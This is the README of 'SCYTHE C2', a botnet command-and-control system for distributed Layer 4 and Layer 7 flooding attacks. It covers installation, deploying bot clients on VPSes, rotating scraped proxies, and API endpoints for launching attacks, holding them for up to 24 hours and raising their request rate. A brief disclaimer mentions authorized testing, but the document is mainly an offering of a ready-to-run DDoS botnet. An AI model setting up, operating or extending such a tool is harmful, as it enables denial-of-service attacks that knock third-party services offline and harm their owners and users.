<div align="center">

# ⚡ SCYTHE C2

### Professional Botnet & Attack Control System

[![Version](https://img.shields.io/badge/Version-3.0.0--MAXIMIZED-blueviolet?style=for-the-badge)](https://github.com/scytheinhere88/scythe-c2)
[![Python](https://img.shields.io/badge/Python-3.10%2B-green?style=for-the-badge&logo=python)](https://python.org)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.115.6-teal?style=for-the-badge&logo=fastapi)](https://fastapi.tiangolo.com)
[![Redis](https://img.shields.io/badge/Redis-7.0-red?style=for-the-badge&logo=redis)](https://redis.io)
[![License](https://img.shields.io/badge/License-Private-orange?style=for-the-badge)](LICENSE)

<p align="center">
  <img src="https://img.shields.io/badge/WebSocket-Real--Time-brightgreen?style=flat-square"/>
  <img src="https://img.shields.io/badge/SSE-Streaming-blue?style=flat-square"/>
  <img src="https://img.shields.io/badge/Proxy-Auto--Rotate-purple?style=flat-square"/>
  <img src="https://img.shields.io/badge/RPS-Drop%20Alert-red?style=flat-square"/>
  <img src="https://img.shields.io/badge/Auth-Session%20Based-yellow?style=flat-square"/>
</p>

</div>

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [Installation](#-installation)
- [Configuration](#-configuration)
- [Usage](#-usage)
- [API Documentation](#-api-documentation)
- [Security](#-security)
- [Troubleshooting](#-troubleshooting)
- [Changelog](#-changelog)

---

## 🎯 Overview

**SCYTHE C2** is a production-grade botnet command & control system designed for distributed network operations. Built with **FastAPI**, **Redis**, and **asyncio**, it delivers real-time coordination, intelligent proxy management, and comprehensive attack orchestration across distributed bot networks.

> ⚠️ **Disclaimer**: This tool is intended for authorized security testing, research, and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.

---

## 🔥 Features

### Core Engine
- ⚡ **Async Architecture** — Built on asyncio for maximum concurrency
- 🎯 **Layer 7 & Layer 4 Attacks** — 18+ methods per layer with real traffic generation
- 🤖 **Botnet Management** — TCP-based bot communication with keep-alive
- 🔄 **Auto-Reconnect** — Bots automatically reconnect with exponential backoff

### Real-Time Control
- 📡 **WebSocket** — Live admin panel updates (`/admin/ws`)
- 📊 **SSE Streaming** — Server-Sent Events for dashboard (`/api/stream`)
- 🚨 **RPS Drop Alerts** — Automatic detection & broadcast of performance drops
- 🔍 **Live Proxy Monitor** — Real-time proxy pool health tracking

### Proxy System
- 🌐 **25+ Sources** — Auto-scrape from GitHub, APIs, and proxy lists
- ✅ **Health Check** — Mass concurrent validation with tier classification
- 🔄 **Auto-Refresh** — Background refresh every 3 minutes
- 🔄 **Mid-Attack Refresh** — Proxy rotation during long attacks (>5 min)
- 📦 **Redis Storage** — Persistent proxy pool with fast lookups

### Security & Management
- 🔐 **Session Auth** — Cookie-based authentication with configurable password
- 🛡️ **Nginx Reverse Proxy** — Production-ready with WebSocket support
- 🔥 **Firewall (UFW)** — Auto-configured port rules
- 🚫 **Fail2ban** — Brute-force protection for API endpoints
- 🔒 **SSL Ready** — Let's Encrypt integration via Certbot
- 📋 **Logrotate** — Automated log management

### Admin Panel (v8.1)
- 🎛️ **System Health** — Real-time endpoint monitoring
- 🌐 **Proxy Management** — Manual refresh, dead proxy removal, custom scraping
- 🤖 **Botnet Status** — Active bots, RPM, total requests
- ⚙️ **Control Center** — Max concurrent attacks, RPS limits
- 🔥 **Ongoing Attacks** — Live progress with RPS adjustment
- 📝 **System Logs** — Real-time log streaming
- 🚨 **RPS Alert Monitor** — Drop detection with severity classification

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        CLIENT BROWSER                        │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
│  │  Dashboard  │  │   Admin     │  │    Login Page       │  │
│  │  (/admin)   │  │  (/admin)   │  │    (/login)         │  │
│  └──────┬──────┘  └──────┬──────┘  └─────────────────────┘  │
│         │                │                                    │
│         └────────────────┘                                    │
│                   │                                           │
│         WebSocket │ HTTP/SSE                                  │
└───────────────────┼───────────────────────────────────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│                    NGINX REVERSE PROXY                         │
│         (WebSocket upgrade + SSE proxy + SSL)                  │
└───────────────────┬───────────────────────────────────────────┘
                    │
┌───────────────────▼───────────────────────────────────────────┐
│                   FASTAPI APPLICATION                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
│  │   Auth      │  │   Routes    │  │  WebSocket Handler  │  │
│  │  (Session)  │  │  (/api/*)   │  │   (/admin/ws)       │  │
│  └──────┬──────┘  └──────┬──────┘  └─────────────────────┘  │
│         │                │                                    │
│         └────────────────┘                                    │
│                   │                                           │
│  ┌────────────────▼──────────────────────────────────────┐   │
│  │              MANAGER LAYER (Singletons)               │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────┐  │   │
│  │  │  Attack  │ │  Proxy   │ │  Botnet  │ │Concurrent│  │   │
│  │  │ Manager  │ │ Manager  │ │ Manager  │ │ Manager │  │   │
│  │  └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬────┘  │   │
│  │       │            │            │            │        │   │
│  │       └────────────┴────────────┴────────────┘        │   │
│  │                      │                                │   │
│  │  ┌───────────────────▼──────────────────────────┐    │   │
│  │  │           REDIS CACHE & PERSISTENCE          │    │   │
│  │  │  ┌──────────┐ ┌──────────┐ ┌──────────────┐   │    │   │
│  │  │  │Proxy Pool│ │Sessions  │ │Attack State  │   │    │   │
│  │  │  │(Hash)    │ │(Keys)    │ │(Sets/Hash)   │   │    │   │
│  │  │  └──────────┘ └──────────┘ └──────────────┘   │    │   │
│  │  └───────────────────────────────────────────────┘    │   │
│  └───────────────────────────────────────────────────────┘   │
│                                                                │
│  ┌──────────────────────────────────────────────────────┐    │
│  │              TCP C2 SERVER (Port 4884)               │    │
│  │         ┌─────────────┐      ┌─────────────┐         │    │
│  │         │   Bot 01    │◄────►│   Bot 02    │         │    │
│  │         │  (VPS)      │      │  (VPS)      │         │    │
│  │         └─────────────┘      └─────────────┘         │    │
│  │                   │                                    │    │
│  │         ┌─────────▼──────────┐                       │    │
│  │         │   Proxy Pool       │                       │    │
│  │         │  (Distributed)     │                       │    │
│  │         └────────────────────┘                       │    │
│  └──────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
```

---

## 🚀 Installation

### Prerequisites

| Requirement | Version | Notes |
|-------------|---------|-------|
| Python | 3.10+ | Required |
| Redis | 6.0+ | Required for state management |
| OS | Linux | Ubuntu 22.04 LTS recommended |
| RAM | 1GB+ | 512MB minimum |
| Disk | 2GB+ | For logs and proxy storage |

### One-Command Setup (Recommended)

```bash
# Clone repository
git clone https://github.com/scytheinhere88/scythe-c2.git
cd scythe-c2

# Run the maximized installer (sets up EVERYTHING)
sudo ./install.sh
```

The installer automatically configures:
- ✅ Python virtual environment
- ✅ Redis server
- ✅ All Python dependencies
- ✅ Nginx reverse proxy
- ✅ UFW firewall rules
- ✅ Fail2ban protection
- ✅ Systemd auto-start service
- ✅ Logrotate configuration
- ✅ Backup & update scripts

### Manual Setup (Advanced)

```bash
# 1. Create virtual environment
python3 -m venv venv
source venv/bin/activate

# 2. Install dependencies
pip install -r requirements.txt

# 3. Configure environment
cp .env.example .env
nano .env  # Edit settings

# 4. Ensure templates exist
mkdir -p app/templates
# Place login.html, dashboard.html, admin.html in app/templates/

# 5. Start Redis
sudo systemctl start redis-server

# 6. Run the server
./run.sh
```

---

## ⚙️ Configuration

### Environment Variables (`.env`)

```ini
# Server Settings
API_PORT=1837              # Dashboard/API port
C2_PORT=4884               # Bot TCP connection port
HOST=0.0.0.0               # Bind address
DEBUG=false                # Debug mode
LOG_LEVEL=INFO             # Logging level

# Security
LOGIN_PASSWORD=scythe88    # Admin password (CHANGE THIS!)
API_KEY=your-random-key    # Auto-generated by installer
SECRET_KEY=your-secret     # Auto-generated by installer

# Redis
REDIS_URL=redis://localhost:6379/0
REDIS_PASSWORD=             # Leave empty for local

# Database
HISTORY_DB=sqlite:///./data/history.db
HISTORY_RETENTION_DAYS=3

# Attack Settings
MAX_CONCURRENT=5           # Max simultaneous attacks
DEFAULT_DURATION=60        # Default attack duration (seconds)
MAX_HOLD_TIME=86400        # Max hold time (24 hours)
ATTACK_RPS_LIMIT=0         # 0 = unlimited

# Proxy Settings
PROXY_REFRESH_INTERVAL=60  # Seconds between refreshes
PROXY_HEALTH_TIMEOUT=5     # Health check timeout
PROXY_SCRAP_TIMEOUT=10     # Scraping timeout
PROXY_POOL_SIZE_LIMIT=10000

# Bot Settings
HEARTBEAT_INTERVAL=10      # Bot heartbeat (seconds)
BOT_RECONNECT_DELAY=5      # Reconnect delay
```

### Bot Configuration (`config.ini`)

```ini
[C2]
IP = YOUR_C2_SERVER_IP     # C2 server public IP
PORT = 4884                # Must match C2_PORT in .env
ID = auto                  # Auto-generate bot ID

[Settings]
HEARTBEAT_INTERVAL = 10
RECONNECT_DELAY = 5
MAX_RECONNECT_ATTEMPTS = 0  # 0 = unlimited
```

---

## 🎮 Usage

### Starting the Server

```bash
# Foreground (development)
./run.sh

# Background daemon
./run.sh --background

# With auto-reload (development)
./run.sh --dev

# Via systemd (production)
sudo systemctl start scythe-c2
```

### Stopping the Server

```bash
# Graceful stop
./stop.sh

# Force kill
./stop.sh --force

# Via systemd
sudo systemctl stop scythe-c2
```

### Accessing the Dashboard

| Endpoint | URL | Description |
|----------|-----|-------------|
| Dashboard | `http://server-ip:1837/` | Main attack control |
| Admin Panel | `http://server-ip:1837/admin` | System management |
| Login | `http://server-ip:1837/login` | Authentication |
| Health | `http://server-ip:1837/health` | System health check |
| Info | `http://server-ip:1837/info` | Server info |

**Default Password**: `scythe88` (change in `.env` immediately!)

### Bot Deployment

```bash
# On bot VPS
git clone https://github.com/scytheinhere88/bot-scythe.git
cd bot-scythe

# Edit config.ini with your C2 server IP
nano config.ini

# Install and run
pip install -r requirements.txt
python3 bot.py
```

---

## 📡 API Documentation

### Authentication

All admin endpoints require session authentication via `scythe_session` cookie.

```bash
# Login
curl -X POST http://server:1837/login   -d "password=scythe88"   -c cookies.txt

# Use cookie for subsequent requests
curl -b cookies.txt http://server:1837/api/attack/active
```

### Attack Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/attack` | Launch new attack |
| POST | `/api/stop/{id}` | Stop specific attack |
| POST | `/api/stopall` | Stop all attacks |
| GET | `/api/attack/active` | List active attacks |
| POST | `/api/attack/update-rps/{id}` | Update RPS mid-attack |

### Proxy Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/proxy/status` | Proxy pool status |
| GET | `/api/proxy/stats` | Proxy statistics |
| GET | `/api/proxy/list` | List proxies |
| POST | `/api/proxy/refresh` | Force refresh pool |
| POST | `/api/proxy/remove-dead` | Remove dead proxies |
| POST | `/api/proxy/scrap` | Scrap from URLs |
| GET | `/api/proxy/monitor` | Live monitor data |
| GET | `/api/proxy/refresh-logs` | Recent refresh logs |

### Botnet Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/botnet/stats` | Bot statistics |

### Config Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/config/concurrent` | Get max concurrent |
| POST | `/api/config/concurrent` | Set max concurrent |
| GET | `/api/config/rps-limit` | Get RPS limit |
| POST | `/api/config/rps-limit` | Set RPS limit |

### Alert Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/alerts/rps` | Get RPS drop alerts |
| POST | `/api/alerts/rps/clear` | Clear alerts |
| POST | `/api/alerts/rps/test` | Trigger test alert |

### Real-Time Endpoints

| Endpoint | Protocol | Description |
|----------|----------|-------------|
| `/admin/ws` | WebSocket | Real-time admin updates |
| `/api/stream` | SSE | Server-Sent Events stream |

---

## 🔒 Security

### Default Security Stack

| Layer | Technology | Purpose |
|-------|------------|---------|
| Firewall | UFW | Port filtering |
| Brute-force | Fail2ban | Auto-ban attackers |
| Reverse Proxy | Nginx | Request handling |
| SSL | Certbot | HTTPS encryption |
| Auth | Session Cookie | Access control |
| Logrotate | Daily | Log management |

### Hardening Checklist

- [ ] Change default password in `.env`
- [ ] Set strong `API_KEY` and `SECRET_KEY`
- [ ] Enable SSL with `certbot --nginx -d your-domain.com`
- [ ] Restrict `ALLOWED_ORIGINS` to your domain
- [ ] Set Redis password in production
- [ ] Enable UFW: `sudo ufw enable`
- [ ] Review fail2ban logs: `sudo fail2ban-client status`

---

## 🔧 Troubleshooting

### Server won't start

```bash
# Check pre-flight
./run.sh --check

# Check logs
tail -f logs/scythe-c2.log

# Check Redis
redis-cli ping

# Check port usage
ss -tlnp | grep 1837
```

### Auth not working (direct to dashboard)

```bash
# 1. Ensure login.html exists
ls -la app/templates/login.html

# 2. Check .env has LOGIN_PASSWORD
 grep LOGIN_PASSWORD .env

# 3. Clear browser cookies / use incognito
```

### Bots not connecting

```bash
# Check C2 port
ss -tlnp | grep 4884

# Check firewall
sudo ufw status

# Verify bot config.ini IP
```

### Proxy pool empty

```bash
# Force refresh
curl -X POST http://server:1837/api/proxy/refresh

# Check logs for scrap errors
tail -f logs/scythe-c2.log | grep "[FETCH]"
```

### WebSocket offline in admin panel

```bash
# Check Nginx WebSocket config
cat /etc/nginx/sites-available/scythe-c2 | grep -A5 "ws"

# Restart Nginx
sudo systemctl restart nginx
```

---

## 📈 Performance Tuning

### Recommended VPS Specs

| Bots | CPU | RAM | Network | Use Case |
|------|-----|-----|---------|----------|
| 1-5 | 2 cores | 2GB | 100Mbps | Small ops |
| 5-20 | 4 cores | 4GB | 500Mbps | Medium ops |
| 20+ | 8 cores | 8GB | 1Gbps | Large ops |

### Redis Optimization

```bash
# /etc/redis/redis.conf
maxmemory 256mb
maxmemory-policy allkeys-lru
save 900 1
save 300 10
```

---

## 📝 Changelog

### v3.0.0-MAXIMIZED (2026-06-22)
- ✅ Added WebSocket real-time updates (`/admin/ws`)
- ✅ Added SSE streaming endpoint (`/api/stream`)
- ✅ Added RPS drop alert system with severity classification
- ✅ Added live proxy monitor with source performance tracking
- ✅ Added proxy refresh log tracking
- ✅ Added periodic update broadcaster (5s interval)
- ✅ Fixed auth redirect handler (HTTPException 307 → actual redirect)
- ✅ Added login.html template with hacker-style UI
- ✅ Added `starlette` to requirements (critical for HTTPException)
- ✅ Added `python-multipart` for form parsing
- ✅ Added systemd service auto-configuration
- ✅ Added nginx reverse proxy with WebSocket support
- ✅ Added UFW firewall auto-configuration
- ✅ Added fail2ban brute-force protection
- ✅ Added logrotate configuration
- ✅ Added backup.sh and update.sh scripts
- ✅ Added pre-flight checks in run.sh
- ✅ Added memory and disk space checks
- ✅ Added port availability verification
- ✅ Added health endpoint pre-check
- ✅ Added random API_KEY and SECRET_KEY generation

### v2.1.0 (Previous)
- Base installer with venv, Redis, deps
- Basic auth with session cookies
- Proxy scraping from 25+ sources
- Botnet TCP communication
- Admin panel v8.1

---

## 📞 Support

| Resource | Link |
|----------|------|
| C2 Server | [github.com/scytheinhere88/scythe-c2](https://github.com/scytheinhere88/scythe-c2) |
| Bot Client | [github.com/scytheinhere88/bot-scythe](https://github.com/scytheinhere88/bot-scythe) |

---

<div align="center">

**SCYTHE C2 v3.0.0 — MAXIMIZED**

*Built for professionals. Designed for performance.*

⚡ 🔥 🛡️

</div>
